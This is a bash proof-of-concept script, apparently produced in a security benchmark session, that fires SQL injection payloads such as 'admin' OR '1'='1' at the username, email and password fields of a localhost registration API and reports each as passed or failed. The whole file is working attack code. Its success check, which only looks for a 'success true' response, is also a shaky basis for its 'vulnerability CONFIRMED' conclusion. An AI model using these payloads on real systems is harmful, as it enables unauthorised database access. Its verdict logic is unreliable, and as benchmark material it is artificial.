#!/bin/bash
# POC: SQL Injection in registration endpoint - demonstrates SQL injection in username, email, and password parameters
# Target: ./repo
# Created: 2025-12-01T16:03:14.471Z
# Session: benchmark-XBEN-069-24-minbd4jr

# SQL Injection POC for Registration Endpoint
# Target: http://localhost:8080/api/register.php
# Demonstrates SQL injection in username, email, and password parameters

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s)

echo "[*] SQL Injection POC - Registration Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: SQL injection in username parameter
echo "[TEST 1] SQL Injection in Username Parameter"
echo "[*] Payload: username=admin' OR '1'='1"
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=admin' OR '1'='1&password=test123&email=sqli_user1_${TIMESTAMP}@test.com")

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "[✓] Test 1 PASSED - SQL injection accepted in username"
  TEST1_PASS=1
else
  echo "[✗] Test 1 FAILED - SQL injection rejected"
  TEST1_PASS=0
fi
echo ""

# Test 2: SQL injection in email parameter
echo "[TEST 2] SQL Injection in Email Parameter"
echo "[*] Payload: email=test' OR '1'='1@test.com"
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=sqli_user2_${TIMESTAMP}&password=test123&email=test' OR '1'='1@test.com")

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "[✓] Test 2 PASSED - SQL injection accepted in email"
  TEST2_PASS=1
else
  echo "[✗] Test 2 FAILED - SQL injection rejected"
  TEST2_PASS=0
fi
echo ""

# Test 3: SQL injection in password parameter
echo "[TEST 3] SQL Injection in Password Parameter"
echo "[*] Payload: password=test' OR '1'='1"
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=sqli_user3_${TIMESTAMP}&password=test' OR '1'='1&email=sqli_user3_${TIMESTAMP}@test.com")

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "[✓] Test 3 PASSED - SQL injection accepted in password"
  TEST3_PASS=1
else
  echo "[✗] Test 3 FAILED - SQL injection rejected"
  TEST3_PASS=0
fi
echo ""

# Summary
echo "[*] === SUMMARY ==="
echo "[*] Test 1 (Username SQLi): $([ $TEST1_PASS -eq 1 ] && echo 'PASSED' || echo 'FAILED')"
echo "[*] Test 2 (Email SQLi): $([ $TEST2_PASS -eq 1 ] && echo 'PASSED' || echo 'FAILED')"
echo "[*] Test 3 (Password SQLi): $([ $TEST3_PASS -eq 1 ] && echo 'PASSED' || echo 'FAILED')"

if [ $TEST1_PASS -eq 1 ] || [ $TEST2_PASS -eq 1 ] || [ $TEST3_PASS -eq 1 ]; then
  echo "[✓] SQL Injection vulnerability CONFIRMED"
  exit 0
else
  echo "[✗] SQL Injection vulnerability NOT CONFIRMED"
  exit 1
fi